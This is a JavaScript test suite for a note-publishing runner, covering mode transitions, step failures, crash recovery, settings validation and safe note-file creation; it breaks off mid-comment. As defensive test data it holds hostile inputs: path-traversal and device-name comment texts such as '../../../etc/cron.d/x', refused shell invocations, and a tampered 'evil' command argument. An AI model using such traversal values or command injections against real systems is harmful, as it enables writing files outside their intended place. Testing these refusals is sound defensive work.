// blyg-run.test.mjs — one Publish-as-blyg run: its named modes (every legal move, every illegal one refused), the steps
// against a fake command in a throwaway git work tree, failure at each step, recovery after a crash, and the safety of the
// note file. Nothing here touches the network or any real site.
//
//   node --test test/blyg-run.test.mjs
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import crypto from 'node:crypto';
import { execFileSync, spawn } from 'node:child_process';
import os from 'node:os';
import path from 'node:path';
import * as Rmod from '../blyg-run.mjs';
// every publisher made here is remembered, so a test can look at the RUN RECORD behind an owner's view (the view itself is plain:
// no command output, no note path; those are in the record and the run's log)
const made = [];
const R = { ...Rmod, createPublisher: d => { const p = Rmod.createPublisher(d); made.push(p); return p; } };
const recOf = v => { for (let i = made.length - 1; i >= 0; i--) if (made[i].book.run.id === v.id) return made[i].book.run; throw new Error('no record for ' + (v && v.id)); };
import * as H from '../blyg-home.mjs';
import { makeRig, until, sleep, thread, blygPage, stamp, mine, ID, FAKE } from './blyg-rig.mjs';

const NOW = new Date('2026-11-23T12:00:00Z');
function boot(rig, { page, config, hook, lstartOf, extra = {} } = {}) {
  const pages = new Map();
  const events = [];
  const pg = page || blygPage([thread('t1', 'A sentence.', 'First thought about liveness.', { blyg: stamp() })]);
  pages.set(pg.url, pg);
  const file = path.join(rig.out, 'run.json');
  const pub = R.createPublisher({
    file, now: () => NOW, broadcast: ev => events.push(ev), hook, ...(lstartOf ? { lstartOf } : {}),
    readConfig: () => ({ blyg_home: config === undefined ? rig.home : config }),
    readPage: url => pages.get(url), savePage: p => pages.set(p.url, p), ...extra,
  });
  return { pub, pages, events, file, page: pg, start: (threadId = 't1', scope = 'one', shown) => pub.start({ page: pages.get(pg.url), threadId, scope, shown: shown !== undefined ? shown : ((config === undefined ? rig.home : config) || {}).confirm || 'always' }),
    mode: () => pub.current().mode };
}
const noteOf = (rig, v) => path.join(rig.top, recOf(v).note_rel);

// ---- the mode table -------------------------------------------------------------------
test('the mode table: every move is either listed or refused, the step is part of the mode, and RunBook.move is the only door', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'bfp-blygtable-'));
  let legal = 0, illegal = 0;
  for (const from of R.RUN_MODES) {
    for (const to of R.RUN_MODES) {
      const run = { mode: from, id: 'x', token: 'y', steps: [] };
      const want = R.RUN_MOVES[from].includes(to);
      assert.equal(R.canMove(from, to), want, `${from} → ${to}`);
      const book = new R.RunBook({ file: path.join(dir, 'none.json') });
      book.run = { ...run };
      if (want) { book.move(to); assert.equal(book.mode, to); legal++; }
      else { assert.throws(() => book.move(to), R.IllegalMove, `${from} → ${to} refused`); assert.equal(book.mode, from, 'and the mode did not change'); illegal++; }
    }
  }
  assert.ok(legal >= 40 && illegal >= 400, `${legal} legal, ${illegal} illegal`);
  assert.throws(() => new R.RunBook({}).move('nonsense'), /no such mode/);
  // a failed step is retried only as itself; an interrupted step continues only as itself (and only apply and publish)
  for (const [failed, to] of Object.entries(R.RETRY_FOR)) {
    assert.ok(R.canMove(failed, to));
    for (const other of R.RUNNING_MODES.filter(x => x !== to)) assert.equal(R.canMove(failed, other), false, `${failed} → ${other}`);
  }
  assert.deepEqual(Object.keys(R.CONTINUE_FOR).sort(), ['interrupted_applied', 'interrupted_applying', 'interrupted_publishing']);
  for (const m of R.INTERRUPTED_MODES) for (const to of R.RUNNING_MODES) assert.equal(R.canMove(m, to), R.CONTINUE_FOR[m] === to, `${m} → ${to}`);
  for (const m of R.FAILED_MODES) assert.ok(!R.RUN_MOVES[m].some(t => t.startsWith('interrupted_')), 'a restart never interrupts a failed run');
  assert.deepEqual(R.RUN_MODES.filter(m => !R.RUN_FINISHED.includes(m)).sort(), [...R.RUN_LIVE].sort());
  fs.rmSync(dir, { recursive: true, force: true });
});

// An older companion's record (mode + failed_step / interrupted_from) is read in today's one field, and written back that way.
test('a stored record of the old shape is migrated: failed + step, interrupted + mode, and an unknown step', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'bfp-blygmig-'));
  const cases = [[{ mode: 'failed', failed_step: 'plan' }, 'failed_plan'], [{ mode: 'failed', failed_step: 'apply' }, 'failed_apply'],
    [{ mode: 'interrupted', interrupted_from: 'publishing' }, 'interrupted_publishing'], [{ mode: 'interrupted', interrupted_from: 'failed' }, 'interrupted_unknown'],
    [{ mode: 'failed' }, 'failed_publish']];
  for (const [rec, want] of cases) {
    const file = path.join(dir, 'r.json');
    fs.writeFileSync(file, JSON.stringify({ id: 'a', token: 't', ...rec }));
    const book = new R.RunBook({ file });
    assert.equal(book.mode, want, JSON.stringify(rec));
    const stored = JSON.parse(fs.readFileSync(file, 'utf8'));
    assert.deepEqual([stored.mode, 'failed_step' in stored, 'interrupted_from' in stored], [want, false, false]);
  }
  // a live mode of the old record is interrupted as usual
  fs.writeFileSync(path.join(dir, 'r.json'), JSON.stringify({ id: 'a', token: 't', mode: 'applying' }));
  assert.equal(new R.RunBook({ file: path.join(dir, 'r.json') }).mode, 'interrupted_applying');
  fs.rmSync(dir, { recursive: true, force: true });
});

test('the mode is written in one place: no other assignment to .mode in the run, the routes or the drawer view', () => {
  const src = fs.readFileSync(new URL('../blyg-run.mjs', import.meta.url), 'utf8');
  const sets = [...src.matchAll(/\.mode\s*=[^=]/g)];
  assert.equal(sets.length, 0, 'nothing assigns .mode');
  assert.equal([...src.matchAll(/mode: to/g)].length, 1, 'the one place a record takes a new mode');
});

// ---- the happy path ----------------------------------------------------------------------
test('Step A writes the note and runs plan only; Step C runs apply then publish; the thread is marked; argv, cwd and env are exactly what is stated', async t => {
  const rig = makeRig({ sub: 'my notes' }); t.after(rig.done);
  process.env.BLYG_TEST_SECRET = 'must-not-reach-the-command';
  t.after(() => { delete process.env.BLYG_TEST_SECRET; });
  const b = boot(rig);
  const r = (await b.start());
  assert.ok(r.ok, r.error);
  await until(() => b.mode() === 'planned', 'planned');
  const v = b.pub.current();
  assert.deepEqual(rig.calls().map(c => c.step), ['plan'], 'only plan has run');
  assert.ok(fs.existsSync(noteOf(rig, v)), 'the note is written');
  assert.equal(recOf(v).note_rel, 'my notes/first-thought-about-liveness.md');
  assert.match(recOf(v).note_text, /^---\ncreated: 2026-11-23\nreleased: "2026-11-23"\nblyg: true\nblyg_id: "([0-9a-hjkmnp-tv-z]{26})"\npermalink: \/b\/\1\n/);
  assert.match(recOf(v).steps[0].output, /plan: ok for my notes\/first-thought-about-liveness\.md\nWould notify: nobody/);
  assert.deepEqual(v.can, ['confirm', 'cancel']);
  const plan = rig.calls()[0];
  assert.equal(plan.argv[2], 'plan');
  assert.equal(plan.argv[3], 'my notes/first-thought-about-liveness.md', '{note} is ONE argument, relative to the work tree, spaces and all');
  assert.equal(plan.argv.length, 4);
  assert.equal(fs.realpathSync(plan.cwd), rig.top, 'cwd is the work tree');
  const allowed = new Set([...H.BASE_ENV_NAMES, 'TERM', 'NO_COLOR', 'CI', 'GIT_TERMINAL_PROMPT']);
  assert.ok(plan.env.every(k => allowed.has(k) || /^(__CF_USER_TEXT_ENCODING|PWD|SHLVL|_|LC_CTYPE)$/.test(k)), `unexpected variables: ${plan.env.filter(k => !allowed.has(k))}`);
  assert.ok(!plan.env.includes('BLYG_TEST_SECRET'));
  assert.ok(['CI', 'TERM', 'NO_COLOR', 'GIT_TERMINAL_PROMPT'].every(k => plan.env.includes(k)));
  // nothing else changed in the work tree outside the notes folder
  assert.deepEqual(fs.readdirSync(rig.top).filter(n => n !== '.git').sort(), ['README.md', 'my notes']);

  const c = await b.pub.confirm({ id: v.id, token: v.token });
  assert.ok(c.ok, c.error);
  await until(() => b.mode() === 'published', 'published');
  assert.deepEqual(rig.calls().map(c2 => c2.step), ['plan', 'apply', 'publish']);
  const done = b.pub.current();
  assert.deepEqual(done.steps.map(s => [s.step, s.ok]), [['plan', true], ['apply', true], ['publish', true]]);
  assert.deepEqual(recOf(done).steps.map(s => [s.step, s.exit]), [['plan', 0], ['apply', 0], ['publish', 0]]);
  assert.ok(!('output' in done.steps[0]) && !('note_rel' in done) && !('note_text' in done), 'the owner\'s view carries no command output and no path');
  const bid = /\nblyg_id: "(\S+)"\n/.exec(recOf(v).note_text)[1];
  assert.equal(done.published.address, `https://site.example.test/b/${bid}`);
  assert.equal(done.published.permalink, `/b/${bid}`);
  const marked = b.pages.get(b.page.url).threads[0].blyg_published;
  assert.deepEqual(Object.keys(marked).sort(), ['address', 'at', 'permalink', 'title', 'version'], 'only what a reader of the page may know (and the version)');
  assert.equal(marked.version, 1);
  const kept = JSON.parse(fs.readFileSync(path.join(path.dirname(b.file), 'blyg-publish-posts.json'), 'utf8'))[marked.permalink];
  assert.deepEqual(Object.keys(kept).sort(), ['at', 'blyg_id', 'note_rel', 'note_sha', 'points', 'slug', 'snapshot', 'texts', 'thread_ids', 'version'], 'what a new version needs is kept on the companion, not on the page');
  // …including what each thread said in it (a later queued press of another thread of the post takes this thread's text from here)
  assert.deepEqual(Object.keys(kept.texts), ['t1']);
  assert.equal(kept.texts.t1[0].text, 'First thought about liveness.');
  assert.equal(fs.statSync(path.join(path.dirname(b.file), 'blyg-publish-posts.json')).mode & 0o777, 0o600);
  assert.equal(marked.address, done.published.address);
  assert.ok(b.events.some(e => e.type === 'page'), 'the page is announced');
  assert.ok(b.events.filter(e => e.type === 'blyg-publish').length >= 6, 'every move is announced');
  // …and the same comment is not offered again
  const again = (await b.start());
  assert.equal(again.ok, false);
  assert.match(again.error, /new version is not set up on the companion yet/, 'publishing again needs the edit commands (see the edit tests)');
});

test('scope "this and the ones above" is one post of the owner\'s earlier unpublished comments in order; "just this one" chains to an earlier published post', async t => {
  const rig = makeRig(); t.after(rig.done);
  const page = blygPage([
    thread('t0', 'Zero passage.', 'Nothing to do with it.', { blyg: stamp() }),
    { id: 'tg', quote: 'x', msgs: [{ author: 'guest', ts: 'g', text: 'a guest' }] },
    thread('t1', 'One passage.', 'First thought.', { blyg: stamp() }),
    { id: 'ta', quote: 'x', msgs: [mine('@claude explain this')] },
    thread('t2', 'Two passage.', 'Second thought.', { blyg: stamp() }),
  ]);
  const b = boot(rig, { page });
  const r = (await b.start('t2', 'above'));
  assert.ok(r.ok, r.error);
  await until(() => b.mode() === 'planned', 'planned');
  const v = b.pub.current();
  assert.deepEqual(v.thread_ids, ['t0', 't1', 't2'], 'the guest\'s and the agent-addressed ones are not the owner\'s to publish');
  assert.ok(recOf(v).note_text.indexOf('Nothing to do with it.') < recOf(v).note_text.indexOf('First thought.') && recOf(v).note_text.indexOf('First thought.') < recOf(v).note_text.indexOf('Second thought.'));
  assert.ok(!recOf(v).note_text.includes('a guest') && !recOf(v).note_text.includes('explain this'));
  await b.pub.confirm({ id: v.id, token: v.token });
  await until(() => b.mode() === 'published', 'published');
  assert.deepEqual(page.threads.filter(x => x.blyg_published).map(x => x.id), ['t0', 't1', 't2']);
  // a later comment: chained to the post above (the most recent), one comment only
  page.threads.push(thread('t3', 'Three passage.', 'Third thought.', { blyg: stamp() }));
  const next = (await b.start('t3', 'one'));
  assert.ok(next.ok, next.error);
  await until(() => b.mode() === 'planned', 'planned again');
  assert.match(recOf(b.pub.current()).note_text, /\n\nEarlier: \[Nothing to do with it\]\(https:\/\/site\.example\.test\/b\/[0-9a-hjkmnp-tv-z]{26}\)\n$/);
  assert.equal(b.pub.current().chained_to.title, 'Nothing to do with it');
});

// ---- one at a time, cancel -----------------------------------------------------------------
test('one run at a time for the whole companion: a second start is refused, not queued, at every unfinished mode', async t => {
  const rig = makeRig(); t.after(rig.done);
  rig.control({ plan: 'sleep' });
  const b = boot(rig);
  assert.ok((await b.start()).ok);
  await until(() => rig.calls().length === 1, 'plan started');
  assert.equal(b.mode(), 'planning');
  for (const id of ['t1']) { const r = (await b.start(id)); assert.equal(r.ok, false); assert.equal(r.status, 409); assert.match(r.error, /already under way \(planning\)/); }
  assert.equal(rig.calls().length, 1, 'nothing was queued');
  b.pub.stopAll();
  await until(() => b.mode().startsWith('failed_'), 'killed plan fails');
  assert.equal(b.pub.current().failed_step, 'plan');
  assert.equal((await b.start()).status, 409, 'a failed run still blocks');
  assert.equal(fs.readdirSync(rig.folder).length, 1, 'and no second note was written');
});

test('cancel at the confirmation removes the draft only if this run made it and it is unchanged, and calls discard when one is set', async t => {
  const rig = makeRig({ discard: true }); t.after(rig.done);
  const b = boot(rig);
  (await b.start()); await until(() => b.mode() === 'planned', 'planned');
  let v = b.pub.current();
  assert.equal((await b.pub.cancel({ id: v.id, token: 'wrong' })).status, 404, 'the run\'s own token is needed');
  assert.equal((await b.pub.cancel({ id: 'nope', token: v.token })).status, 404);
  const c = await b.pub.cancel({ id: v.id, token: v.token });
  assert.ok(c.ok, c.error);
  assert.equal(b.mode(), 'cancelled');
  assert.equal(fs.existsSync(noteOf(rig, v)), false);
  assert.deepEqual(rig.calls().map(x => x.step), ['plan', 'discard']);
  assert.equal(c.view.cleanup.outcome, 'undone');
  // changed since it was written: kept
  const b2 = boot(rig);
  (await b2.start()); await until(() => b2.mode() === 'planned', 'planned 2');
  v = b2.pub.current();
  fs.appendFileSync(noteOf(rig, v), '\nI edited this.\n');
  const c2 = await b2.pub.cancel({ id: v.id, token: v.token });
  assert.ok(c2.ok);
  assert.equal(fs.existsSync(noteOf(rig, v)), true, 'the owner\'s edit is not thrown away');
  assert.match(c2.view.cleanup.said, /changed since this run wrote it.*left as it is/);
  assert.equal(c2.view.cleanup.outcome, 'left');
});

test('Publish is refused out of order: confirm only from planned, with the right id and token, once', async t => {
  const rig = makeRig(); t.after(rig.done);
  const b = boot(rig);
  assert.equal((await b.pub.confirm({ id: 'x', token: 'y' })).status, 404, 'no run at all');
  (await b.start());
  const v0 = b.pub.current();
  const early = await b.pub.confirm({ id: v0.id, token: v0.token });
  assert.ok(!early.ok && early.status === 409, 'not while planning');
  await until(() => b.mode() === 'planned', 'planned');
  const v = b.pub.current();
  assert.equal((await b.pub.confirm({ id: v.id, token: 'x'.repeat(v.token.length) })).status, 404);
  assert.ok((await b.pub.confirm({ id: v.id, token: v.token })).ok);
  assert.equal((await b.pub.confirm({ id: v.id, token: v.token })).ok, false, 'a second click is refused');
  await until(() => b.mode() === 'published', 'published');
  assert.equal(rig.calls().filter(c => c.step === 'publish').length, 1, 'published once');
});

// ---- failure at each step ---------------------------------------------------------------------
for (const [stepName, after] of [['plan', []], ['apply', ['plan']], ['publish', ['plan', 'apply']]]) {
  test(`${stepName} fails: the run says which step, shows the output, runs nothing further and retries nothing by itself; the owner's click tries it again`, async t => {
    const rig = makeRig(); t.after(rig.done);
    rig.control({ [stepName]: 'fail' });
    const b = boot(rig);
    (await b.start());
    if (stepName !== 'plan') { await until(() => b.mode() === 'planned', 'planned'); const v = b.pub.current(); await b.pub.confirm({ id: v.id, token: v.token }); }
    await until(() => b.mode().startsWith('failed_'), 'failed');
    const v = b.pub.current();
    assert.equal(v.failed_step, stepName);
    assert.match(recOf(v).failed_reason, new RegExp(`${stepName} exited with code 1`));
    assert.equal(v.failure, '', 'no recognised plain line: the drawer says "Something went wrong while …"');
    assert.equal(v.tries, 1);
    const last = recOf(v).steps[recOf(v).steps.length - 1];
    assert.equal(last.step, stepName);
    assert.match(last.output, /something broke\nrun the same --push again, or --abandon/, 'the command\'s own words, surfaced');
    assert.deepEqual(rig.calls().map(c => c.step), [...after, stepName], 'nothing after the failed step ran');
    await sleep(250);
    assert.equal(rig.calls().length, after.length + 1, 'and nothing was retried automatically');
    assert.equal(b.pages.get(b.page.url).threads[0].blyg_published, undefined, 'not marked published');
    assert.deepEqual(v.can, ['retry', 'abandon']);
    // the owner fixes it and clicks: that step again, then on
    rig.control({});
    const re = await b.pub.retry({ id: v.id, token: v.token });
    assert.ok(re.ok, re.error);
    await until(() => ['planned', 'published'].includes(b.mode()), 'moved on');
    assert.equal(rig.calls().filter(c => c.step === stepName).length, 2);
    assert.equal(b.mode(), stepName === 'plan' ? 'planned' : 'published');
  });
}

test('abandon: before apply the draft goes; after apply nothing is touched and the command\'s own words stay on the page', async t => {
  const rig = makeRig(); t.after(rig.done);
  rig.control({ plan: 'fail' });
  const b = boot(rig);
  (await b.start()); await until(() => b.mode().startsWith('failed_'), 'failed');
  let v = b.pub.current();
  assert.ok(fs.existsSync(noteOf(rig, v)));
  const a = await b.pub.abandon({ id: v.id, token: v.token });
  assert.ok(a.ok); assert.equal(b.mode(), 'abandoned');
  assert.equal(fs.existsSync(noteOf(rig, v)), false, 'a failed plan\'s draft is cleaned up');
  rig.control({ publish: 'fail' });
  const b2 = boot(rig);
  (await b2.start()); await until(() => b2.mode() === 'planned', 'planned');
  v = b2.pub.current();
  await b2.pub.confirm({ id: v.id, token: v.token });
  await until(() => b2.mode().startsWith('failed_'), 'failed at publish');
  v = b2.pub.current();
  const a2 = await b2.pub.abandon({ id: v.id, token: v.token });
  assert.ok(a2.ok);
  assert.ok(fs.existsSync(noteOf(rig, v)), 'after apply the note is left alone');
  assert.match(a2.view.cleanup.said, /your site keeps its own record/);
  assert.match(recOf(v).steps.at(-1).output, /--abandon/);
  assert.equal((await b2.pub.abandon({ id: v.id, token: v.token })).status, 409, 'once');
});

// ---- crash and restart ---------------------------------------------------------------------
test('a companion restart mid-run leaves a record that offers only "show what happened" and "abandon"', async t => {
  const rig = makeRig(); t.after(rig.done);
  fs.writeFileSync(path.join(rig.folder, 'x.md'), 'T');
  for (const mode of ['planning', 'planned', 'applying', 'applied', 'publishing']) {
    const file = path.join(rig.out, `crash-${mode}.json`);
    fs.writeFileSync(file, JSON.stringify({ mode, id: 'abc', token: 'tok', note_rel: '_notes/x.md', note_text: 'T', note_sha: crypto.createHash('sha256').update('T').digest('hex'), steps: [{ step: 'plan', exit: 0, output: 'seen' }], failed_step: 'apply', page_url: 'u', thread_ids: ['t1'] }));
    const pub = R.createPublisher({ file, readConfig: () => ({ blyg_home: rig.home }), readPage: () => null, savePage: () => {}, broadcast: () => {} });
    const v = pub.current();
    assert.equal(v.mode, 'interrupted_' + mode, mode);
    assert.equal(v.interrupted_from, mode, 'the view names the mode that was interrupted');
    assert.deepEqual(v.can, ['applying', 'applied', 'publishing'].includes(mode) ? ['continue', 'abandon'] : ['abandon'], mode);
    assert.equal(recOf(v).steps[0].output, 'seen', 'what happened is still shown');
    assert.equal((await pub.confirm({ id: 'abc', token: 'tok' })).status, 409);
    assert.equal((await pub.retry({ id: 'abc', token: 'tok' })).status, 409);
    assert.equal((await pub.cancel({ id: 'abc', token: 'tok' })).status, 409);
    assert.equal((await pub.start({ page: blygPage([thread('t1', 'q', 'w')]), threadId: 't1', scope: 'one', shown: 'always' })).status, 409, 'and it blocks a new run');
    const a = await pub.abandon({ id: 'abc', token: 'tok' });
    assert.ok(a.ok, mode);
    assert.equal(pub.current().mode, 'abandoned');
    assert.equal(JSON.parse(fs.readFileSync(file, 'utf8')).mode, 'abandoned', 'and it is recorded');
  }
  // a finished record stays finished
  const file = path.join(rig.out, 'crash-published.json');
  fs.writeFileSync(file, JSON.stringify({ mode: 'published', id: 'q', token: 't' }));
  assert.equal(R.createPublisher({ file, readConfig: () => ({}), readPage: () => null, savePage: () => {}, broadcast: () => {} }).current().mode, 'published');
  // an unreadable or foreign record is no run
  fs.writeFileSync(file, '{not json');
  assert.equal(R.createPublisher({ file, readConfig: () => ({}), readPage: () => null, savePage: () => {}, broadcast: () => {} }).current().mode, 'idle');
});

// ---- the settings, validated when saved and again when used --------------------------------------
test('nothing runs unless the setting is complete: every rule has its refusal, and a refused start writes nothing', async t => {
  const rig = makeRig(); t.after(rig.done);
  const notgit = fs.mkdtempSync(path.join(os.tmpdir(), 'bfp-notgit-')); t.after(() => fs.rmSync(notgit, { recursive: true, force: true }));
  const outside = path.join(notgit, 'link');
  fs.symlinkSync(notgit, outside);
  const prog = path.join(rig.out, 'prog'); fs.writeFileSync(prog, '#!/bin/sh\n'); fs.chmodSync(prog, 0o755);
  const noexec = path.join(rig.out, 'noexec'); fs.writeFileSync(noexec, 'x');
  const good = rig.home.commands;
  const bads = [
    ['unset', undefined, /not set up/],
    ['relative folder', { ...rig.home, folder: '_notes' }, /absolute/],
    ['missing folder', { ...rig.home, folder: path.join(rig.top, 'nope') }, /does not exist/],
    ['not a git work tree', { ...rig.home, folder: notgit }, /inside a git work tree/],
    ['a symlink out of the tree', { ...rig.home, folder: outside }, /inside a git work tree/],
    ['inside .git', { ...rig.home, folder: path.join(rig.top, '.git') }, /git work tree/],
    ['no commands', { ...rig.home, commands: undefined }, /commands/],
    ['missing publish', { ...rig.home, commands: { plan: good.plan, apply: good.apply } }, /“publish” is not set/],
    ['no {note}', { ...rig.home, commands: { ...good, plan: [process.execPath, FAKE] } }, /{note}/],
    ['a shell', { ...rig.home, commands: { ...good, plan: ['/bin/sh', '-c', 'echo {note}'] } }, /shell/],
    ['bash by name', { ...rig.home, commands: { ...good, apply: ['bash', '{note}'] } }, /shell/],
    ['env as the program', { ...rig.home, commands: { ...good, apply: ['env', 'x', '{note}'] } }, /shell/],
    ['a string, not argv', { ...rig.home, commands: { ...good, plan: 'scripts/x {note}' } }, /argv list/],
    ['argv with a number', { ...rig.home, commands: { ...good, plan: [process.execPath, 5, '{note}'] } }, /every argument must be a string/],
    ['{note} in the program', { ...rig.home, commands: { ...good, plan: ['{note}', 'x'] } }, /program itself/],
    ['not executable', { ...rig.home, commands: { ...good, plan: [noexec, '{note}'] } }, /not an executable/],
    ['relative program that escapes the tree', { ...rig.home, commands: { ...good, plan: ['../../../../bin/ls', '{note}'] } }, /not an executable|outside/],
    ['too many arguments', { ...rig.home, commands: { ...good, plan: [prog, ...Array(40).fill('a'), '{note}'] } }, /more than 32/],
    ['unknown command', { ...rig.home, commands: { ...good, rm: [prog, '{note}'] } }, /unknown command/],
    ['filename with a slash', { ...rig.home, filename: '../${slug}.md' }, /file name pattern/],
    ['filename without a slug', { ...rig.home, filename: 'note.md' }, /\$\{slug\}/],
    ['filename not .md', { ...rig.home, filename: '${slug}.sh' }, /\.md/],
    ['filename placeholder', { ...rig.home, filename: '${slug}${title}.md' }, /placeholder/],
    ['bad template', { ...rig.home, template: 'a: |\nb' }, /template/],
    ['bad escape', { ...rig.home, escape: 'maybe' }, /escape/],
    ['bad zone', { ...rig.home, timezone: 'Mars/Base' }, /time zone/],
    ['env_pass: PATH', { ...rig.home, env_pass: ['PATH'] }, /env_pass/],
    ['env_pass: lower case', { ...rig.home, env_pass: ['home'] }, /env_pass/],
  ];
  for (const [name, cfg, re] of bads) {
    const v = H.validateHome(cfg);
    assert.equal(v.ok, false, name);
    assert.match(v.errors.join(' | '), re, name);
    const b = boot(rig, { config: cfg === undefined ? null : cfg });
    const r = (await b.start());
    assert.equal(r.ok, false, name); assert.equal(r.status, 409, name);
    assert.match(r.error, /not set up correctly/, name);
  }
  assert.deepEqual(fs.readdirSync(rig.folder), [], 'nothing was written');
  assert.deepEqual(rig.calls(), [], 'nothing was run');
  assert.ok(H.validateHome(rig.home).ok);
});

test('a setting changed after the run started stops the next step (validated again when used)', async t => {
  const rig = makeRig(); t.after(rig.done);
  let cfg = rig.home;
  const pages = new Map(); const page = blygPage([thread('t1', 'q', 'A thought on this.', { blyg: stamp() })]); pages.set(page.url, page);
  const pub = R.createPublisher({ file: path.join(rig.out, 'run.json'), now: () => NOW, broadcast: () => {}, readConfig: () => ({ blyg_home: cfg }), readPage: u => pages.get(u), savePage: () => {} });
  assert.ok((await pub.start({ page, threadId: 't1', scope: 'one', shown: 'always' })).ok);
  await until(() => pub.current().mode === 'planned', 'planned');
  const v = pub.current();
  cfg = { ...rig.home, commands: { ...rig.home.commands, publish: [process.execPath, FAKE, rig.log, rig.ctl, 'evil', '{note}'] } };
  await pub.confirm({ id: v.id, token: v.token });
  await until(() => pub.current().mode.startsWith('failed_'), 'failed');
  assert.match(recOf(pub.current()).failed_reason, /settings changed/);
  assert.deepEqual(rig.calls().map(c => c.step), ['plan'], 'neither apply nor the changed command ran');
});

// ---- the note file ----------------------------------------------------------------------------
test('the note file: never overwrites, never follows a link out, never leaves the folder, unique permalink', async t => {
  const rig = makeRig(); t.after(rig.done);
  const elsewhere = path.join(rig.out, 'elsewhere.txt'); fs.writeFileSync(elsewhere, 'untouched');
  fs.writeFileSync(path.join(rig.folder, 'first-thought-about-liveness.md'), 'an existing note');
  fs.symlinkSync(elsewhere, path.join(rig.folder, 'first-thought-about-liveness-2.md'));
  fs.writeFileSync(path.join(rig.folder, 'other.md'), '---\ntitle: o\npermalink: /b/first-thought-about-liveness-3\n---\nx');
  const b = boot(rig);
  const r = (await b.start());
  assert.ok(r.ok, r.error);
  const v = r.view;
  assert.equal(recOf(v).note_rel, '_notes/first-thought-about-liveness-3.md', 'past a file and a symlink; the file name is only the first words, the address is the id');
  assert.equal(fs.readFileSync(path.join(rig.folder, 'first-thought-about-liveness.md'), 'utf8'), 'an existing note');
  assert.equal(fs.readFileSync(elsewhere, 'utf8'), 'untouched', 'nothing was written through the link');
  assert.equal(R.addressFrom('see https://a.test/b/x/ and https://a.test/other', '/b/x'), 'https://a.test/b/x/');
  assert.equal(R.addressFrom('https://u:p@a.test/b/x', '/b/x'), '', 'credentials are never an address');
  assert.equal(R.addressFrom('https://a.test/b/y', '/b/x'), '', 'a URL that is not the post\'s is not guessed at');
});

test('hostile comment text cannot change where the file goes', async t => {
  const rig = makeRig(); t.after(rig.done);
  for (const text of ['../../../etc/cron.d/x CON \\ nul: <b>', '.. / .', 'CON', '\u202eevil\u202c.md', '日本語 only', 'a'.repeat(400)]) {
    const b = boot(rig, { page: blygPage([thread('t1', 'q', text, { blyg: stamp() })]) });
    const r = (await b.start());
    assert.ok(r.ok, `${text}: ${r.error}`);
    assert.match(recOf(r.view).note_rel, /^_notes\/[a-z0-9]+(-[a-z0-9]+)*\.md$/, text);
    assert.equal(path.dirname(path.join(rig.top, recOf(r.view).note_rel)), rig.folder);
    await until(() => b.mode() === 'planned', 'planned');
    const v = b.pub.current();
    await b.pub.cancel({ id: v.id, token: v.token });
  }
  assert.deepEqual(fs.readdirSync(rig.top).filter(n => n !== '.git').sort(), ['README.md', '_notes']);
});

// ---- the optional prepare step -------------------------------------------------------------------
test('with a prepare command the run goes drafted > preparing > planning > planned, prepare runs before plan, and its output is kept with the plan', async t => {
  const rig = makeRig({ prepare: true, discard: true }); t.after(rig.done);
  const b = boot(rig);
  const modes = [];
  b.events.push = e => { if (e.type === 'blyg-publish') modes.push(e.run.mode); return 0; };
  assert.ok((await b.start()).ok);
  await until(() => b.mode() === 'planned', 'planned');
  assert.deepEqual(modes, ['checking', 'drafted', 'preparing', 'planning', 'planned']);
  assert.deepEqual(rig.calls().map(c => c.step), ['prepare', 'plan']);
  const v = b.pub.current();
  assert.deepEqual(recOf(v).steps.map(s => [s.step, s.exit]), [['prepare', 0], ['plan', 0]]);
  assert.equal(rig.calls()[0].argv[3], recOf(v).note_rel, 'prepare gets {note} as one argument too');
  // Cancel: discard runs because prepare ran, and it is the owner's one undo for both
  const c = await b.pub.cancel({ id: v.id, token: v.token });
  assert.ok(c.ok);
  assert.deepEqual(rig.calls().map(x => x.step), ['prepare', 'plan', 'discard']);
  assert.equal(fs.existsSync(path.join(rig.top, recOf(v).note_rel)), false);
});

test('without a prepare command the run goes straight from drafted to planning, as before', async t => {
  const rig = makeRig(); t.after(rig.done);
  const b = boot(rig);
  const modes = [];
  b.events.push = e => { if (e.type === 'blyg-publish') modes.push(e.run.mode); return 0; };
  (await b.start()); await until(() => b.mode() === 'planned', 'planned');
  assert.deepEqual(modes, ['checking', 'drafted', 'planning', 'planned']);
  assert.deepEqual(rig.calls().map(c => c.step), ['plan']);
});

test('prepare fails: failed(prepare) with its output, plan never runs, nothing retries by itself; the owner\'s click retries prepare only, then plan', async t => {
  const rig = makeRig({ prepare: true, discard: true }); t.after(rig.done);
  rig.control({ prepare: 'fail' });
  const b = boot(rig);
  (await b.start()); await until(() => b.mode().startsWith('failed_'), 'failed');
  let v = b.pub.current();
  assert.equal(v.failed_step, 'prepare');
  assert.match(recOf(v).failed_reason, /prepare exited with code 1/);
  assert.match(recOf(v).steps[0].output, /something broke/);
  await sleep(250);
  assert.deepEqual(rig.calls().map(c => c.step), ['prepare'], 'plan did not run and nothing was retried');
  assert.equal((await b.pub.confirm({ id: v.id, token: v.token })).ok, false);
  rig.control({});
  assert.ok((await b.pub.retry({ id: v.id, token: v.token })).ok);
  await until(() => b.mode() === 'planned', 'planned after retry');
  assert.deepEqual(rig.calls().map(c => c.step), ['prepare', 'prepare', 'plan']);
  // a plan failure after a good prepare retries plan only
  const rig2 = makeRig({ prepare: true }); t.after(rig2.done);
  rig2.control({ plan: 'fail' });
  const b2 = boot(rig2);
  (await b2.start()); await until(() => b2.mode().startsWith('failed_'), 'plan failed');
  v = b2.pub.current();
  assert.equal(v.failed_step, 'plan');
  rig2.control({});
  await b2.pub.retry({ id: v.id, token: v.token });
  await until(() => b2.mode() === 'planned', 'planned');
  assert.deepEqual(rig2.calls().map(c => c.step), ['prepare', 'plan', 'plan'], 'prepare is not run again');
});

test('abandon after a failed prepare takes the draft away through discard', async t => {
  const rig = makeRig({ prepare: true, discard: true }); t.after(rig.done);
  rig.control({ prepare: 'fail' });
  const b = boot(rig);
  (await b.start()); await until(() => b.mode().startsWith('failed_'), 'failed');
  const v = b.pub.current();
  const a = await b.pub.abandon({ id: v.id, token: v.token });
  assert.ok(a.ok);
  assert.deepEqual(rig.calls().map(c => c.step), ['prepare', 'discard']);
  assert.equal(fs.existsSync(path.join(rig.top, recOf(v).note_rel)), false);
});

// A failed run is not "mid-run": nothing of it is running. A restart used to turn it into `interrupted` (interrupted_from 'failed'),
// which dropped `failed_step`, so a run that failed at PLAN was then treated as one past apply: abandon skipped the discard and the
